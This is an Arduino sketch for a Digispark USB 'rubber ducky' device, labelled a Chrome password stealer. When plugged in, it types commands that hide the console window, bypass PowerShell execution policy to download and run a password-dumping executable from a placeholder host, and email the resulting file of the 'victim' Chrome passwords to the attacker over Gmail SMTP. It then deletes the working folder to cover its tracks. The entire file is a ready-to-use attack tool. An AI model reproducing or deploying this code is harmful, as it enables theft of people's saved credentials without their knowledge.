//Chrome Password Stealer for digispark rubber ducky - coded by SpeedCuber
//http://www.nirsoft.net/toolsdownload/chromepass.zip -> extract and rename chromepassviewer to c.exe
// change http://0.0.0.0/c.exe with chromepassviewer.exe download link

#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000);
  pinMode(1, OUTPUT);
  
 DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("cmd");
   DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("mode con:cols=18 lines=1"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_M);
  DigiKeyboard.delay(100);
  for (int i = 0; i <= 150; i++)
  {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  }
    DigiKeyboard.delay(100);
 DigiKeyboard.println("cd Downloads & mkdir PASS & cd PASS");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
DigiKeyboard.delay(300);
 DigiKeyboard.print(F("echo (wget  http://0.0.0.0/c.exe -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & start a.exe /stext pass.txt"));
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$SMTPInfo.EnableSsl = $true"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'yourpassword')"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail.From = 'youremail@gmail.com'"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail.To.Add('youremail@gmail.com')"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail.Subject = 'CHROME PASS Report'"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail.Body = 'Attached is your victim Chrome Passwords'"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$ReportEmail.Attachments.Add('pass.txt')"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("cd .."));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("rmdir PASS /s"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(1,HIGH);
  delay(700);
  digitalWrite(1,LOW);
  delay(700);

}
